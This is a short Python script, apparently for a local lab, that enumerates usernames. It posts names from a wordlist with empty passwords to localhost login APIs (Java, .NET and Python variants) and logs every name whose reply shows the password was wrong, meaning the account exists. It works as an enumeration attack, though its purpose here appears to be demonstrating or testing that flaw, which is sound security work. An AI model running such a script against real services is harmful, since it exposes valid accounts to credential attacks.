import requests

with open("wordlist/users.txt", "r") as file:
    lines = file.readlines()

    for line in lines:
    
        user_name  = line.strip()
        payload  = {'login': user_name, 'password': ''}

        # Request API em Java
        # r = requests.post('http://localhost:8080/auth/login', json=payload)  

        # Request API em .Net
        # r = requests.post('http://localhost:5127/api/authentication/login', json=payload)

        # Request API em Python
        r = requests.post('http://localhost:5000/user/login', json=payload)

        message = r.text
        if (message == "Senha Incorreta!" or message == '{"message":"Wrong password!!!"}'):
            with open("usuarios_validos.txt", "a") as result:
                result.write(user_name+"\n")